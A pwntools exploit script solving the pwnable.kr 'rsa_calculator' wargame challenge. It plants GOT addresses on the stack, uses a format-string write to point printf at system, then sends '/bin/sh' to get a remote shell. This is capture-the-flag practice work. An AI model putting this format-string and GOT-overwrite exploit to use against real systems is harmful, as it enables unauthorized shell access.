from pwn import *
context(arch="amd64", os="linux")

#pro = process("./rsa_calculator")
pro = remote("pwnable.kr", 9012)
elf = ELF("./rsa_calculator")
target_got = elf.got["printf"]
system_plt = elf.symbols["system"]
print(target_got, "\t", system_plt)

def ru(x):
    global pro
    if isinstance(x, str):
        res = pro.recvuntil(x.encode()).decode()
    else:
        res = pro.recvuntil(x)
    print(res)
    return res

def str_to_hex(s):
    res = ''
    for c in s:
        res += hex(ord(c)).lstrip('0x').ljust(8, '0')
    return res.encode()

def recv_menu():
    ru(b'exit\n')

def set_key(p, q, e, d):
    pro.sendline(b'1')
    ru(b' : ')
    pro.sendline(str(p).encode())
    ru(b' : ')
    pro.sendline(str(q).encode())
    ru(b' : ')
    pro.sendline(str(e).encode())
    ru(b' : ')
    pro.sendline(str(d).encode())

def decrypt(data, recv_size):
    pro.sendline(b'3')
    ru(b' : ')
    pro.sendline(b'-1')
    ru(b'data')
    print(data)
    if isinstance(data, str):
        data = data.encode()
    pro.sendline(data)
    ru(b'-\n')
    if recv_size > 0:
        res = pro.recv(recv_size)
        print(res)
        return res


recv_menu()
set_key(16, 16, 1, 1)
recv_menu()
payload = str_to_hex("a" * 44)
payload += p64(target_got) + p64(target_got + 2) + p64(target_got + 4)
res = decrypt(payload, 32)
recv_menu()
pre_sz = 64 + 1920 + 2110
payload = str_to_hex("%58$hn%64c%57$hn%1920c%56$hn")
print(payload)
res = decrypt(payload, 0)
print(pro.recvline())
recv_menu()
print(pro.recvline())
pro.sendline(b"3")
print(pro.recvline())
pro.sendline(b"-1")
payload = str_to_hex("/bin/sh")
pro.sendline(payload)
print(pro.recvline())
print(pro.recvline())
pro.interactive()
